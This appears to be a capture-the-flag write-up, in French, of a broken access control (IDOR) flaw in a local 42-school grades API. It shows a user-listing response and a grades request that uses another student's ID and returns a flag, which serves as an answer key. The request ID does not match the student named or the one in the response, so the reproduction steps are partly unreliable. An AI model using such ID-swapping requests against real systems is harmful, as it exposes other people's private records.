**A01 Broken Access Control / IDOR (Insecure Direct Object Reference), BOLA (Broken Object Level Authorization)**

Definition : 

Cette vulnerabilite correspond a une absence de controle ou un defaut de controle d'acces au niveau des objets. L'API permet a un utlisateur de consulter les donnees d'un etudiant en fournissant directement son identifiant dans le query parameter `student`, sans verifier que l'utilisateur connecte dispose des autorisations.

Un attaquant connaissant ou pouvant obtenir l'identifiant d'un autre etudiant peut ainsi acceder aux notes de tous les etudiants. 

**Processus de decouverte / Reproduction**

Sur la route `localhost:4942/api/docs-internal` on nous dit : `"note": "flag field accessible via GET /api/grades?student={id}"`

Un utilisateur loggue sur la plateforme peut avoir acces a la route suivante : `localhost:4942/api/users`: 

```json
[
  {
    "id": "z4p1cnx47mfy50f",
    "username": "jdoe",
    "email": "jdoe@student.42.tech",
    "role": "cadet",
    "level": 1.42,
    "campus": "Wilcity"
  },
  {
    "id": "8l16vboi47dmand",
    "username": "benjamin",
    "email": "benjamin@student.42.tech",
    "role": "student",
    "level": 8.51,
    "campus": "Wilcity"
  },
  {
    "id": "02g7nfbtw0k83fu",
    "username": "dorian",
    "email": "dorian@student.42.tech",
    "role": "student",
    "level": 5.12,
    "campus": "Wilcity"
  },
  {
    "id": "sf6wtjycbyev4ah",
    "username": "thanos",
    "email": "thanos@student.42.tech",
    "role": "student",
    "level": 12.77,
    "campus": "Lyon"
  },
  {
    "id": "0e9p852l6utwaal",
    "username": "anne-sophie",
    "email": "anne-sophie@student.42.tech",
    "role": "student",
    "level": 6.3,
    "campus": "Wilcity"
  },
  {
    "id": "xxv1btvtzaxen5h",
    "username": "moderator",
    "email": "moderator@42network.fr",
    "role": "student",
    "level": 0,
    "campus": "HQ"
  },
  {
    "id": "2na6hw2z9p1yosj",
    "username": "emilie",
    "email": "emilie@42.tech",
    "role": "cadet",
    "level": 17.3,
    "campus": "Wilcity"
  },
  {
    "id": "k1asdfeditojrb4",
    "username": "wil",
    "email": "wil@42network.fr",
    "role": "staff",
    "level": 21,
    "campus": "HQ"
  },
  {
    "id": "enplwhu8jfo56oi",
    "username": "sophie",
    "email": "sophie@42.tech",
    "role": "god",
    "level": 42,
    "campus": "HQ"
  }
]
```

Le probleme : les id des etudiants sont disponibles pour tous. 

Ce qui nous permet derriere de recuperer les notes de l'etudiant souhaite, par exemple `jdoe`, c'est lui qui nous donne le flag : 

GET : `http://localhost:4942/api/grades?student=0e9p852l6utwaal`

```json
[
  {
    "collectionId": "q8bzkwvmxbvut0o",
    "collectionName": "grades",
    "created": "2026-06-06 14:15:10.021Z",
    "expand": {
      "project": {
        "collectionId": "eo9672jde9s4uvu",
        "collectionName": "projects",
        "created": "2026-06-06 14:15:09.339Z",
        "description": "Your first own C library",
        "difficulty": "easy",
        "id": "wl8jjufomev59ha",
        "module": "C",
        "name": "Libft",
        "real_42": true,
        "slug": "libft",
        "updated": "2026-06-06 14:15:09.339Z",
        "xp": 462
      }
    },
    "flag": "",
    "id": "qsbavjijdvq3zv2",
    "project": "wl8jjufomev59ha",
    "score": 100,
    "student": "z4p1cnx47mfy50f",
    "updated": "2026-06-06 14:15:10.021Z"
  },
  {
    "collectionId": "q8bzkwvmxbvut0o",
    "collectionName": "grades",
    "created": "2026-06-06 14:15:10.052Z",
    "expand": {
      "project": {
        "collectionId": "eo9672jde9s4uvu",
        "collectionName": "projects",
        "created": "2026-06-06 14:15:09.371Z",
        "description": "Recode printf from scratch",
        "difficulty": "easy",
        "id": "1n17329ci682ev1",
        "module": "C",
        "name": "ft_printf",
        "real_42": true,
        "slug": "ft_printf",
        "updated": "2026-06-06 14:15:09.371Z",
        "xp": 882
      }
    },
    "flag": "",
    "id": "2x3qfavjqii3jtp",
    "project": "1n17329ci682ev1",
    "score": 85,
    "student": "z4p1cnx47mfy50f",
    "updated": "2026-06-06 14:15:10.052Z"
  },
  {
    "collectionId": "q8bzkwvmxbvut0o",
    "collectionName": "grades",
    "created": "2026-06-06 14:15:10.316Z",
    "expand": {
      "project": {
        "collectionId": "eo9672jde9s4uvu",
        "collectionName": "projects",
        "created": "2026-06-06 14:15:09.601Z",
        "description": "Web security — find all vulnerabilities",
        "difficulty": "god",
        "id": "i9bnu5ze2u87g5m",
        "module": "Security",
        "name": "Darkly",
        "real_42": false,
        "slug": "darkly",
        "updated": "2026-06-06 14:15:09.601Z",
        "xp": 3000
      }
    },
    "flag": "FLAG{md5_1s_4_n4m3pl4t3_n0t_4_l0ck}",
    "id": "si6ovwi34bb82c6",
    "project": "i9bnu5ze2u87g5m",
    "score": 0,
    "student": "z4p1cnx47mfy50f",
    "updated": "2026-06-06 14:15:10.316Z"
  }
]
```
